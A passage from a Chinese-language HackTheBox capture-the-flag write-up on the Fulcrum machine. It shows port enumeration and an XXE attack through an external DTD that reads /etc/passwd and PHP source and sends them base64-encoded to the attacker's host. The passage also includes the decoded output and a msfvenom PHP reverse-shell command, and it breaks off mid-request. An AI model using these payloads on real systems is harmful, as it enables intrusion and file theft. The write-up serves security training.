<br>CrazyInSide:~/HackTheBox$ <br></code></pre></td></tr></table></figure><p>端口88是一个PHPMYadmin：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220903084403060.png" alt="image-20220903084403060"></p><p>尝试输入了root:root没进去。先放着，后边再说。9999端口与80是一样的：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220903084910786.png" alt="image-20220903084910786"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ dirsearch -u http://10.10.10.62:9999/      <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/crazyinside/.dirsearch/reports/10.10.10.62-9999/-_22-09-03_08-48-51.txt<br><br>Error Log: /home/crazyinside/.dirsearch/logs/errors-22-09-03_08-48-51.<span class="hljs-built_in">log</span><br><br>Target: http://10.10.10.62:9999/<br><br>[08:48:51] Starting: <br>[08:49:31] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd<br>[08:50:46] 200 -    5KB - /index.htm<br><br>Task Completed<br></code></pre></td></tr></table></figure><p>端口56423打开是一个json格式的数据：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220903085454375.png" alt="image-20220903085454375"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ curl -I http://10.10.10.62:56423/<br>HTTP/1.1 200 OK<br>Date: Sat, 03 Sep 2022 00:54:17 GMT<br>Content-Type: application/json;charset=utf-8<br>Connection: keep-alive<br>Server: Fulcrum-API Beta<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ curl http://10.10.10.62:56423/  <br>&#123;<span class="hljs-string">&quot;Heartbeat&quot;</span>:&#123;<span class="hljs-string">&quot;Ping&quot;</span>:<span class="hljs-string">&quot;Pong&quot;</span>&#125;&#125;<br>                                                                                                                                                                                                                                                                                 <br>CrazyInSide:~/HackTheBox$ curl -X POST http://10.10.10.62:56423/<br>&#123;<span class="hljs-string">&quot;Heartbeat&quot;</span>:&#123;<span class="hljs-string">&quot;Ping&quot;</span>:<span class="hljs-string">&quot;Pong&quot;</span>&#125;&#125;<br><br>                                                                                                                                                                                                                                                                                 <br>CrazyInSide:~/HackTheBox$ curl -X POST http://10.10.10.62:56423 -d &#123;<span class="hljs-string">&quot;Heartbeat&quot;</span>:&#123;<span class="hljs-string">&quot;Ping&quot;</span>:<span class="hljs-string">&quot;ping&quot;</span>&#125;&#125;<br>&#123;<span class="hljs-string">&quot;Heartbeat&quot;</span>:&#123;<span class="hljs-string">&quot;Ping&quot;</span>:<span class="hljs-string">&quot;Pong&quot;</span>&#125;&#125;<br><br>                                                                                                                                                                                                                                                                                 <br>CrazyInSide:~/HackTheBox$ curl -X POST http://10.10.10.62:56423 -d <span class="hljs-string">&#x27;&#123;&quot;Heartbeat&quot;:&#123;&quot;Ping&quot;:&quot;ping&quot;&#125;&#125;&#x27;</span> <br>&#123;<span class="hljs-string">&quot;Heartbeat&quot;</span>:&#123;<span class="hljs-string">&quot;Ping&quot;</span>:<span class="hljs-string">&quot;Pong&quot;</span>&#125;&#125;<br><br><br>CrazyInSide:~/HackTheBox$ curl -X POST http://10.10.10.62:56423 -d <span class="hljs-string">&#x27;&#123;&quot;Heartbeat&quot;:&#123;&quot;Ping&quot;:&quot;ping&quot;&#125;&#125;&#x27;</span> -H <span class="hljs-string">&#x27;Content-Type: application/json&#x27;</span><br>&#123;<span class="hljs-string">&quot;Heartbeat&quot;</span>:&#123;<span class="hljs-string">&quot;Ping&quot;</span>:<span class="hljs-string">&quot;Pong&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>好像都没什么反应，搜索相关资料，提示说这种API可以尝试提交json数据，HTTP参数，甚至XML都可以。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ curl -X POST http://10.10.10.62:56423 -d <span class="hljs-string">&#x27;Heartbeat[Ping]=Pong&#x27;</span>                                             <br>&#123;<span class="hljs-string">&quot;Heartbeat&quot;</span>:&#123;<span class="hljs-string">&quot;Ping&quot;</span>:<span class="hljs-string">&quot;Pong&quot;</span>&#125;&#125;<br><br>                                                                                                                                                                                                                                                                                 <br>CrazyInSide:~/HackTheBox$ curl http://10.10.10.62:56423 -d <span class="hljs-string">&#x27;Heartbeat[Ping]=Pong&#x27;</span> <br>&#123;<span class="hljs-string">&quot;Heartbeat&quot;</span>:&#123;<span class="hljs-string">&quot;Ping&quot;</span>:<span class="hljs-string">&quot;Pong&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>参数也不行。我尝试xml时候：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ curl -X POST http://10.10.10.62:56423 -d <span class="hljs-string">&#x27;&lt;Heartbeat&gt;&lt;Ping&gt;Ping&lt;/Ping&gt;&lt;/Heartbeat&gt;&#x27;</span><br>&#123;<span class="hljs-string">&quot;Heartbeat&quot;</span>:&#123;<span class="hljs-string">&quot;Ping&quot;</span>:<span class="hljs-string">&quot;Ping&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>它变了。</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220903091137881.png" alt="image-20220903091137881"></p><p>尝试读取文件，目标只显示ping pong，无法正常读取文件。</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220903091230723.png" alt="image-20220903091230723"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ <span class="hljs-built_in">cat</span> payload.dtd <br>&lt;!ENTITY % file SYSTEM <span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;<br>&lt;!ENTITY % all <span class="hljs-string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://10.10.16.3/?%file;&#x27;&gt;&quot;</span>&gt;<br>%all;<br>                                                                                                                                                                                                                                                                                 <br>CrazyInSide:~/HackTheBox$ <br></code></pre></td></tr></table></figure><p>再构造数据包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.62:56423<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>115<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">data</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://10.10.16.3/payload.dtd&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span><span class="hljs-symbol">&amp;send;</span><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span></span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">10.10.10.62 - - [03/Sep/2022 09:32:22] <span class="hljs-string">&quot;GET /?cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwOToxMTU6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTA6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTExOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCmx4ZDp4Ojk5ODoxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCnVzYm11eDp4OjExMjo0Njp1c2JtdXggZGFlbW9uLCwsOi92YXIvbGliL3VzYm11eDovdXNyL3NiaW4vbm9sb2dpbgpkbnNtYXNxOng6MTEzOjY1NTM0OmRuc21hc3EsLCw6L3Zhci9saWIvbWlzYzovdXNyL3NiaW4vbm9sb2dpbgpsaWJ2aXJ0LXFlbXU6eDo2NDA1NToxMDg6TGlidmlydCBRZW11LCwsOi92YXIvbGliL2xpYnZpcnQ6L3Vzci9zYmluL25vbG9naW4KbGlidmlydC1kbnNtYXNxOng6MTE0OjEyMDpMaWJ2aXJ0IERuc21hc3EsLCw6L3Zhci9saWIvbGlidmlydC9kbnNtYXNxOi91c3Ivc2Jpbi9ub2xvZ2luCg==</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwOToxMTU6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTA6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTExOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCmx4ZDp4Ojk5ODoxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCnVzYm11eDp4OjExMjo0Njp1c2JtdXggZGFlbW9uLCwsOi92YXIvbGliL3VzYm11eDovdXNyL3NiaW4vbm9sb2dpbgpkbnNtYXNxOng6MTEzOjY1NTM0OmRuc21hc3EsLCw6L3Zhci9saWIvbWlzYzovdXNyL3NiaW4vbm9sb2dpbgpsaWJ2aXJ0LXFlbXU6eDo2NDA1NToxMDg6TGlidmlydCBRZW11LCwsOi92YXIvbGliL2xpYnZpcnQ6L3Vzci9zYmluL25vbG9naW4KbGlidmlydC1kbnNtYXNxOng6MTE0OjEyMDpMaWJ2aXJ0IERuc21hc3EsLCw6L3Zhci9saWIvbGlidmlydC9kbnNtYXNxOi91c3Ivc2Jpbi9ub2xvZ2luCg==&quot;</span>|<span class="hljs-built_in">base64</span> -d<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin<br>syslog:x:104:110::/home/syslog:/usr/sbin/nologin<br>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin<br>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false<br>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin<br>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin<br>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin<br>pollinate:x:110:1::/var/cache/pollinate:/bin/false<br>sshd:x:111:65534::/run/sshd:/usr/sbin/nologin<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false<br>usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin<br>dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin<br>libvirt-qemu:x:64055:108:Libvirt Qemu,,,:/var/lib/libvirt:/usr/sbin/nologin<br>libvirt-dnsmasq:x:114:120:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/usr/sbin/nologin<br></code></pre></td></tr></table></figure><p>这似乎没有一个标准的用户是能够用来正常登录的，猜路径吧，猜了半天，4端口是叫uploads：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ <span class="hljs-built_in">cat</span> payload.dtd <br>&lt;!ENTITY % file SYSTEM <span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=/var/www/uploads/index.php&quot;</span>&gt;<br>&lt;!ENTITY % all <span class="hljs-string">&quot;&lt;!ENTITY send SYSTEM &#x27;http://10.10.16.3/?%file;&#x27;&gt;&quot;</span>&gt;<br>%all;<br>                                                                                                                                                                                                                                                                                 <br>CrazyInSide:~/HackTheBox$ <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">0.10.10.62 - - [03/Sep/2022 09:49:07] <span class="hljs-string">&quot;GET /payload.dtd HTTP/1.0&quot;</span> 200 -<br>10.10.10.62 - - [03/Sep/2022 09:49:07] <span class="hljs-string">&quot;GET /?PD9waHAKaWYoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gIT0gIjEyNy4wLjAuMSIpCnsKCWVjaG8gIjxoMT5VbmRlciBNYWludGFuY2U8L2gxPjxwPlBsZWFzZSA8YSBocmVmPVwiaHR0cDovLyIgLiAkX1NFUlZFUlsnU0VSVkVSX0FERFInXSAuICI6NC9pbmRleC5waHA/cGFnZT1ob21lXCI+dHJ5IGFnYWluPC9hPiBsYXRlci48L3A+IjsKfWVsc2V7CgkkaW5jID0gJF9SRVFVRVNUWyJwYWdlIl07CglpbmNsdWRlKCRpbmMuIi5waHAiKTsKfQo/PgoK HTTP/1.0&quot;</span> 200 -<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PD9waHAKaWYoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gIT0gIjEyNy4wLjAuMSIpCnsKCWVjaG8gIjxoMT5VbmRlciBNYWludGFuY2U8L2gxPjxwPlBsZWFzZSA8YSBocmVmPVwiaHR0cDovLyIgLiAkX1NFUlZFUlsnU0VSVkVSX0FERFInXSAuICI6NC9pbmRleC5waHA/cGFnZT1ob21lXCI+dHJ5IGFnYWluPC9hPiBsYXRlci48L3A+IjsKfWVsc2V7CgkkaW5jID0gJF9SRVFVRVNUWyJwYWdlIl07CglpbmNsdWRlKCRpbmMuIi5waHAiKTsKfQo/PgoK&quot;</span>|<span class="hljs-built_in">base64</span> -d<br>&lt;?php<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] != <span class="hljs-string">&quot;127.0.0.1&quot;</span>)<br>&#123;<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;Under Maintance&lt;/h1&gt;&lt;p&gt;Please &lt;a href=\&quot;http://&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_ADDR&#x27;</span>] . <span class="hljs-string">&quot;:4/index.php?page=home\&quot;&gt;try again&lt;/a&gt; later.&lt;/p&gt;&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$inc</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;page&quot;</span>];<br>        include(<span class="hljs-variable">$inc</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>&#125;<br>?&gt;<br><br>                                                                                                                                                                                                                                                                                 <br>CrazyInSide:~/HackTheBox$ <br></code></pre></td></tr></table></figure><p>只有远程地址等于127.0.0.1才能包含：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=4444 -f raw &gt; shell.php<br>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload<br>[-] No <span class="hljs-built_in">arch</span> selected, selecting <span class="hljs-built_in">arch</span>: php from the payload<br>No encoder specified, outputting raw payload<br>Payload size: 1111 bytes<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.62:56423<br><span 